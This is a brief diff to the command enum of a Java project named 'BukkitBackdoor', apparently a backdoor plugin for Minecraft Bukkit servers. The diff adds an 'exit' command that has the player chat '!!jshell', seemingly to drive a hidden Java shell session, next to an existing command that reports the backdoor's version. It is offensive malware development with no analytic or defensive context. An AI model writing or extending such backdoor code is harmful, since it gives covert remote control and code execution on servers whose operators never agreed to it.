@@ -13,6 +13,9 @@ public enum CommandEnum {
     }),
     VERSION("v", (player) -> {
         player.sendMessage("BukkitBackdoor v${project.version}");
+    }),
+    EXIT("exit", (player) -> {
+        player.chat("!!jshell");
     });
 
     private final String keyword;
